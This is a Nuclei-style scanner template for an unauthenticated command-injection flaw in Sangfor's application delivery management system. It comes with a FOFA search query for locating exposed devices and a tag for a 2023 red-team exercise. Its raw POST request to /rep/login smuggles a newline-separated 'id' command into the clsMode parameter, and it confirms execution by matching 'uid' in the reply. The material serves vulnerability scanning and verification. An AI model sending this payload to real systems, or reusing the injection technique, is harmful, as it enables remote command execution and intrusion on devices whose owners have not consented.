id: Sangfor-ADMS-rce-login
info:
  name: Sangfor-ADMS-rce-login
  author: hufei
  severity: high
  description: |
     深信服 应用交付管理系统任意命令执行
  reference:
  metadata:
    max-request: 1
    fofa-query: fid="iaytNA57019/kADk8Nev7g=="
    verified: true
    product: Sangfor-ADMS
  tags: 2023,HVV,Sangfor-ADMS

http:
  - raw:
      - |
        POST /rep/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

    matchers:
      - type: word
        part: body
        words:
          - 'uid'